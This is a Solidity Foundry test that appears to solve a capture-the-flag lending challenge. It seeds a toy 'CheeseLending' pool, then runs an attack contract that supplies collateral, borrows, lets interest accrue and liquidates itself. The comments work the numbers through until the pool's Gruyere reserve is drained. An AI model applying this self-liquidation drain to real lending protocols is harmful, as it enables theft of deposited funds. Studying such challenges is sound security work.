// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {CheeseLending} from "targets/cheese_lending/src/CheeseLending.sol";
import {Cheese} from "targets/cheese_lending/src/Cheese.sol";
import {PoolState} from "targets/cheese_lending/src/pool/PoolState.sol";
import {CheeseAttack} from "src/cheese_lending/CheeseAttack.sol";

// Was: tried to import Cow from targets/cheese_lending/script/Cow.s.sol but that file uses
// bare "src/..." imports that resolve against our main repo, not the target's foundry project.
// Fix: replicate Cow's seeding inline (approve pool + supply 10 of each from a cow EOA).

contract CheeseLendingAttackTest is Test {
    Cheese gruy;
    Cheese emm;
    CheeseLending pool;
    CheeseAttack attack;

    address player = makeAddr("player");
    address cow = makeAddr("cow");

    function setUp() public {
        gruy = new Cheese(0, "Gruyere", "GRY");
        emm  = new Cheese(0, "Emmental", "ETL");
        pool = new CheeseLending(player, address(gruy), address(emm));

        // Mint player's 100 of each and cow's seed 10 of each
        gruy.mint(player, 100 ether);
        emm.mint(player, 100 ether);
        gruy.mint(cow, 10 ether);
        emm.mint(cow, 10 ether);
        gruy.dropMint();
        emm.dropMint();

        // Cow seeds the pool by supplying 10 of each (what Cow.init does on deploy)
        vm.startPrank(cow);
        gruy.approve(address(pool), type(uint256).max);
        emm.approve(address(pool), type(uint256).max);
        pool.supply(address(emm), 10 ether);
        pool.supply(address(gruy), 10 ether);
        vm.stopPrank();

        PoolState.ReserveData memory re = pool.getReserve(address(emm));
        PoolState.ReserveData memory rg = pool.getReserve(address(gruy));
        assertEq(re.totalSupplied, 10 ether);
        assertEq(rg.totalSupplied, 10 ether);
    }

    function test_attack_drains_gruyere_supply_and_solves() public {
        // --- Deploy attack + fund it from the player ---
        vm.startPrank(player);
        attack = new CheeseAttack(pool, gruy, emm);
        // Attack needs gruy to supply as collateral and emm as buffer to repay the
        // accrued debt during self-liquidation (borrow gives 4.5e18 emm, accrued
        // debt at t+1000 is 9e18, so we front-fund extra emm from player).
        gruy.transfer(address(attack), 10 ether);
        emm.transfer(address(attack), 10 ether);
        vm.stopPrank();

        // --- Phase 1: supply 9.8 gruy, borrow 4.5 emm (sub-max LTV) ---
        // Chosen so that after W=1000s of interest accrual:
        //   accrued debt  = 4.5e18 * (1 + 1000*1e15/1e18) = 9.0e18
        //   debtValueRep  = 9.0e18 * price[emm=2]         = 18.0e18
        //   collateral    = 18.0e18 * 11000/10000         = 19.8e18 (in gruy tokens, price=1)
        //   userColl      = 9.8e18  →  over-drain branch fires
        //   totalSupplied[gruy] = 10e18 + 9.8e18 − 19.8e18 = 0
        uint256 supAmt = 9.8 ether;
        uint256 brwAmt = 4.5 ether;
        attack.openPosition(supAmt, brwAmt);

        PoolState.ReserveData memory r = pool.getReserve(address(gruy));
        assertEq(r.totalSupplied, 19.8 ether, "post-supply gruy total wrong");

        // --- Wait ~16.67 minutes of block time for interest to accrue ---
        vm.warp(block.timestamp + 1000);

        // --- Phase 2: self-liquidate with a fixed amount = 9e18 ---
        // liquidate() caps amount to userDebt internally, so over-accrual (from
        // longer waits on live chains) is harmless, but amount itself must stay
        // at the number the math was sized for or collateral overflows.
        uint256 accrued = pool.getDebt(address(attack), address(emm));
        assertEq(accrued, 9 ether, "accrued debt math off");
        attack.liquidateSelf(9 ether);

        // --- Verify gruy is fully drained and lending invariant flipped ---
        r = pool.getReserve(address(gruy));
        assertEq(r.totalSupplied, 0, "gruy totalSupplied not zero");
        assertEq(r.totalDebt, 0,    "gruy totalDebt not zero");

        // --- Flip the solved flag ---
        attack.finalize();
        assertTrue(pool.isSolved(), "challenge not solved");
    }
}
